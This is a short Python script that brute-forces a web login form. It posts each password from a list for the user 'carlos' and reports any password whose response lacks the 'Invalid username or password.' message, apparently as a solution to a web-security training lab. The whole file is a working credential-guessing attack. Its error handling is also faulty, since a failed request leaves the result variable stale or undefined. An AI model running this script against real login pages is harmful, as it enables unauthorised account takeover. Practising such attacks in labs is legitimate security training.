import requests


def brute_force(url, psw_list):

    datas = {
        'username': 'carlos',
        'password': None
    }

    for password in psw_list:

        datas['password']=password

        try:
            result = requests.post(url, data=datas)

        except Exception as e:
            pass

        response = result.text

        have = response.find('Invalid username or password.')

        if have == -1:
            print(f'password found[+] -> {password}')

    return None